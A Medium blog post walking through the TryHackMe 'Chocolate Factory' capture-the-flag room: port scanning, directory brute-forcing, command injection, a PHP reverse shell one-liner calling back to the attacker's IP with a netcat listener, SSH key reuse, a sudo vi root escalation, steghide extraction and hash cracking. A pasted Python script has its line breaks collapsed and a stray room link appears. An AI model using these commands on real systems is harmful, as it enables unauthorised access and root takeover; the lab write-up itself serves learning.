---
title: "Chocolate Factory Tryhackme Writeup 6f7eeb33e8f0"
platform: Medium
original_file: 2024-08-24_Chocolate-Factory-Tryhackme-Writeup-6f7eeb33e8f0.md
---

# Chocolate Factory Tryhackme Writeup 6f7eeb33e8f0

::: {}
# Chocolate Factory Tryhackme Writeup {#chocolate-factory-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/chocolatefactory Note: This room
is free
:::

::::::: {.section .e-content field="body"}
:::::: {#5a30 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Chocolate Factory Tryhackme Writeup {#3d00 .graf .graf--h3 .graf--leading .graf--title name="3d00"}

<figure id="1d52" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*8CHattrfj0kA9l3v.png"
class="graf-image" data-image-id="0*8CHattrfj0kA9l3v.png"
data-width="526" data-height="255" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory){.markup--anchor
.markup--p-anchor
data-href="https://tryhackme.com/room/chocolatefactory"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is free**

### Enumeration {#90fa .graf .graf--h3 .graf-after--p name="90fa"}

<figure id="2db6" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*CZJd0FP2ab452_VK.png"
class="graf-image" data-image-id="0*CZJd0FP2ab452_VK.png"
data-width="583" data-height="399" />
</figure>

Room link:
[https://tryhackme.com/room/malstrings](https://tryhackme.com/room/malstrings){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/malstrings"
rel="noopener ugc nofollow noopener" target="_blank"}\
Note: This room is free

So what do we have here?

- [Port 21: FTP which allowing anonymous login and the file
  „gum_room.jpg" because nmap was executing the anonymous login for
  us]{#93bf}
- [Port 22: SSH]{#90f1}
- [Port 80: Apache Webserver]{#d059}
- [Port 100, 106, 109, 110, 111, 113, 119, 125 (all with the same
  service banner)]{#c4d0}

After i rooted the the box i realized that they were two slightly
different routes.

- [Path 1,]{#05e8}
- [Path 2,]{#e1af}

### Path 1 {#eea0 .graf .graf--h3 .graf-after--li name="eea0"}

<figure id="8054" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*Z9_rDYEyj5g2v_xW.png"
class="graf-image" data-image-id="0*Z9_rDYEyj5g2v_xW.png"
data-width="578" data-height="560" />
</figure>

I try sql Injection to bypass login but bad luck

### Gobuster {#494a .graf .graf--h3 .graf-after--p name="494a"}

``` {#3526 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u 10.10.208.225 -w directory-list-2.3-medium.txt -t 50 -x .php,.txt,.html
```

<figure id="6f29" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Kc0Pr1D_IWan_eKP.png"
class="graf-image" data-image-id="0*Kc0Pr1D_IWan_eKP.png"
data-width="457" data-height="143" />
</figure>

As Gobuster found the **home.php** i took a look at it.

<figure id="d0e8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*HShgK9_QwVNlnhta.png"
class="graf-image" data-image-id="0*HShgK9_QwVNlnhta.png"
data-width="875" data-height="206" />
</figure>

we got command injection on this page

Let's try to get reverse shell

``` {#926a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="swift"}
php -r '$sock=fsockopen("10.2.12.26",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Start netcat listener

``` {#a929 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 4444
```

<figure id="5002" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*tp0h-wbuaQzhb9F7.png"
class="graf-image" data-image-id="0*tp0h-wbuaQzhb9F7.png"
data-width="376" data-height="90" />
</figure>

<figure id="cef2" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*HSxBaFTTFMvCN3gK.png"
class="graf-image" data-image-id="0*HSxBaFTTFMvCN3gK.png"
data-width="720" data-height="204" />
</figure>

Boom, we´re in as www-data!

**Upgrade TTY Shell**

``` {#df00 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/null
```

At the home.php we saw a key_rev_key file which is looking very
interesting. It´s an executable so lets do it.

Ok, we should take a closer look with the command
`strings key_rev_key`{.markup--code .markup--p-code}

<figure id="cc0b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-QGxWcXQI0J5qyC8.png"
class="graf-image" data-image-id="0*-QGxWcXQI0J5qyC8.png"
data-width="576" data-height="624" />
</figure>

<figure id="a839" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*oyCcBRUFE9ZBqxiD.png"
class="graf-image" data-image-id="0*oyCcBRUFE9ZBqxiD.png"
data-width="739" data-height="284" />
</figure>

we found charlie password

Awesome! We got the the key. Submit it and straight to the home
directories.

<figure id="09ef" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*r1WQ2xaR_zOIzFf_.png"
class="graf-image" data-image-id="0*r1WQ2xaR_zOIzFf_.png"
data-width="465" data-height="147" />
</figure>

Ok, so we´re not able to read the user flag but we have a private and
public SSH key. By copying the output of `cat teleport`{.markup--code
.markup--p-code} we save it on our attacker machine and reconnect
directly with ssh

<figure id="47d8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qQlK_rL6RUSpsDUn.png"
class="graf-image" data-image-id="0*qQlK_rL6RUSpsDUn.png"
data-width="825" data-height="474" />
</figure>

<figure id="6be3" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*OE4gI4NgQviuOvt5.png"
class="graf-image" data-image-id="0*OE4gI4NgQviuOvt5.png"
data-width="565" data-height="146" />
</figure>

We got user flag

### Privilege Escalation {#e861 .graf .graf--h3 .graf-after--p name="e861"}

<figure id="e710" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*YprI58694OvqOkoY.png"
class="graf-image" data-image-id="0*YprI58694OvqOkoY.png"
data-width="598" data-height="174" />
</figure>

We can execute vi with root permissions and you´ll asking yourself how
would be helpful? Just create a new file and start binaries within vi.

sudo vi test and type `:!bash`{.markup--code .markup--p-code} and hit
enter. or use the one liner from GTFOBins

``` {#96b4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo vi -c ':!/bin/sh' /dev/null
```

<figure id="0827" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*kfLnEzT0fonEt6nS.png"
class="graf-image" data-image-id="0*kfLnEzT0fonEt6nS.png"
data-width="806" data-height="407" />
</figure>

For more information about abusing sudo permissions check out
[**GTFOBins**](https://gtfobins.github.io/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/"
rel="noopener ugc nofollow noopener" target="_blank"}

Get that root flag! But whait.... what? There´s a **root.py** in the
folder which contains the follwoing code

``` {#23c8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
from cryptography.fernetimport Fernetimport pyfigletkey=input("Enter the key:  ")f=Fernet(key)encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'dcrypt_mess=f.decrypt(encrypted_mess)mess=dcrypt_mess.decode()display1=pyfiglet.figlet_format("You Are Now The Owner Of ")display2=pyfiglet.figlet_format("Chocolate Factory ")print(display1)print(display2)print(mess)
```

By using our obtained key from the binary „key_rev_key" we can run the
python script enter the desired key which we found

<figure id="0efb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7ICXWPgogxZtWG8C.png"
class="graf-image" data-image-id="0*7ICXWPgogxZtWG8C.png"
data-width="792" data-height="594" />
</figure>

### Path 2 {#b5c7 .graf .graf--h3 .graf-after--figure name="b5c7"}

``` {#71a8 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
nmap -sC 10.10.208.225
```

<figure id="0fb5" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*VLGrKzBmSIpLHHpx.png"
class="graf-image" data-image-id="0*VLGrKzBmSIpLHHpx.png"
data-width="723" data-height="538" />
</figure>

We found Anonymous ftp

<figure id="04ba" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rtMJC3sf631ddQoj.png"
class="graf-image" data-image-id="0*rtMJC3sf631ddQoj.png"
data-width="707" data-height="485" />
</figure>

`steghide`{.markup--code .markup--p-code} ! And try our luck with a
blank password.

<figure id="9ad0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Mnwhb9wgrZLw2XON.png"
class="graf-image" data-image-id="0*Mnwhb9wgrZLw2XON.png"
data-width="563" data-height="246" />
</figure>

Yes! a file named b64.txt is embedded in the jpg. With steghide we can
extract that file too.

<figure id="13ce" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CyR3t-hUf4OTPtP7.png"
class="graf-image" data-image-id="0*CyR3t-hUf4OTPtP7.png"
data-width="597" data-height="240" />
</figure>

as expected a base64 encoded text

A quick decode will bring us a nice little hash of the user „charlie"

``` {#c158 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat b64.txt | base64 -d
```

<figure id="abdd" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*SUfWYyqUFFiketuf.png"
class="graf-image" data-image-id="0*SUfWYyqUFFiketuf.png"
data-width="875" data-height="144" />
</figure>

I copied the hash on my machine and ran hashcat on it.

<figure id="4235" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pxPCJqR0b0KTd6pj.png"
class="graf-image" data-image-id="0*pxPCJqR0b0KTd6pj.png"
data-width="875" data-height="221" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#dd18 .graf .graf--h3 .graf-after--figure name="dd18"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#a3f9 .graf .graf--h3 .graf-after--p name="a3f9"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 24, 2024](https://medium.com/p/6f7eeb33e8f0).

[Canonical
link](https://medium.com/@bevijaygupta/chocolate-factory-tryhackme-writeup-6f7eeb33e8f0){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
